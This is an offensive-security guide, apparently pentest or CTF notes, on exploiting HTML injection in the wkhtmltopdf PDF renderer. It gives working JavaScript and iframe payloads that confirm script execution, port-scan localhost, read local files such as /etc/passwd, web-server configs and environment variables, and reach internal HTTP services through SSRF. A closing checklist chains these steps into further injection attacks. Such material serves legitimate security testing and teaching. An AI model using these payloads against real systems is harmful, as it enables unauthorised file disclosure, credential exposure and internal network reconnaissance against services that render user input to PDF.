# PDF Generation Exploitation — wkhtmltopdf

wkhtmltopdf is a headless WebKit browser that renders HTML to PDF. It executes JavaScript, makes network requests, and reads local files — all the same things a real browser does, just server-side. If user-controlled input reaches the HTML that gets rendered, you have server-side XSS with a much richer attack surface than reflected XSS in a browser.

---

## Confirming Code Execution

The first thing to verify is that JavaScript actually runs during rendering. Inject a `<script>` that writes to the document:

```html
<script>document.write('<br>JS-OK: ' + window.location + '<br>')</script>
```

If the rendered PDF contains `JS-OK: file:///tmp/tmp_wkhtmlto_pdf_XXXX.html`, you have confirmed:
1. JavaScript executes during rendering.
2. The temp HTML file path — useful for chaining with other attacks.
3. The renderer is wkhtmltopdf (the `file:///tmp/` path is characteristic).

---

## Internal Port Discovery

wkhtmltopdf's network error messages end up in the PDF byte stream. Failed connections produce `Error: Failed to load http://127.0.0.1:PORT/` lines embedded in the binary. This lets you port-scan from inside the renderer:

```html
<script>
var ports = [80, 443, 3000, 3306, 5432, 5000, 6379, 7000, 8000, 8080, 8443, 9000, 9200];
ports.forEach(function(p) {
    var x = new XMLHttpRequest();
    x.timeout = 2500;
    x.open("GET", "http://127.0.0.1:" + p + "/", true);
    x.send();
});
</script>
```

Extract the results:
```bash
strings output.pdf | grep -E "(Connection refused|Error:|OK|200)"
```

Ports that connect and return content won't show "Connection refused". Ports that actively refuse appear in the error output. Absence of error for a given port = open and serving content.

---

## Reading Local Files

wkhtmltopdf can fetch `file://` URIs via XMLHttpRequest:

```html
<script>
var x = new XMLHttpRequest();
x.onload = function() {
    document.body.innerHTML = '<pre>' + this.responseText + '</pre>';
};
x.open("GET", "file:///etc/passwd", true);
x.send();
</script>
```

Useful paths to try:
- `/etc/passwd` — user enumeration
- `/etc/hosts` — other hosts in the network
- `/etc/resolv.conf` — DNS servers / domain name
- `/proc/self/environ` — environment variables (wkhtmltopdf may restrict this)
- `/var/www/html/index.php` — PHP source of the current app
- `/etc/apache2/sites-enabled/000-default.conf` — Apache vhost config, reveals other vhosts and listen directives
- `/etc/nginx/sites-enabled/default` — nginx config

Reading application source via LFI often reveals more attack surface than any other technique. The Apache/nginx config is particularly valuable because it discloses internal virtual hosts not exposed on the public interface.

**Important:** wkhtmltopdf enforces the Same-Origin Policy for `file://` → `http://` requests. You can do `file://` → `file://` (same protocol), but you can't use XHR to read a `file://` URL from a script that originated via `http://`. The inline `<script>` approach works because the page itself is a `file://` document.

---

## SSRF via iframe

iframes bypass the SOP restriction that blocks XHR. To read content from an internal HTTP service:

```html
<iframe src="http://127.0.0.1:8000/" width="800" height="600"></iframe>
```

The iframe content renders inside the PDF. Use `pdftotext output.pdf -` to extract text, or open the PDF and read the rendered iframe.

**Size matters:** iframes that are too large (>~1000px height, >~1500px width) may be clipped or dropped silently. Start with `width=600 height=700` and adjust if content is missing.

**Chaining:** After discovering the internal service structure via iframe, you can hit specific endpoints:
```html
<iframe src="http://127.0.0.1:8000/api/users" width="800" height="600"></iframe>
```

Each payload = one PDF render. Plan your probes efficiently.

---

## Common Pitfalls

**`document.write` after page load wipes the document.** If you use `document.write()` inside an XHR `onload` callback, it clears the entire page and only your output remains. This means you lose all other injected notes/content. Use `document.body.innerHTML = ...` (or `+=`) instead.

**Async vs synchronous XHR.** In wkhtmltopdf, synchronous XHR (`open(..., false)`) often produces no output — the renderer doesn't wait for it. Always use async XHR with an `onload` callback.

**Note isolation.** If the app is multi-user or if notes are globally visible, your injected scripts may render alongside other users' content and pollute the output. Clean up injected payloads between tests.

**Errors embedded as plain text.** The wkhtmltopdf error log is embedded as raw bytes in the PDF. `strings output.pdf | grep -i error` is your debugging output for things like failed network requests, missing files, and SSL errors.

**`file://` path on the target.** The temp HTML file is at `/tmp/tmp_wkhtmlto_pdf_XXXX.html`. You can read it back with `file:///tmp/tmp_wkhtmlto_pdf_XXXX.html` but you need to know the exact name, which changes per render. Normally not needed.

---

## Quick Checklist

1. Inject `<script>document.write(window.location)</script>` — confirms JS execution and shows renderer context.
2. Inject XHR loop over common ports — identify internal services.
3. Read Apache/nginx config via `file://` LFI — find hidden vhosts.
4. Iframe the internal service's root — map available endpoints.
5. Use iframe + specific endpoint to extract data.
6. If the data is behind a query parameter or injection point, chain with another injection class (XPath, SQLi, etc.).
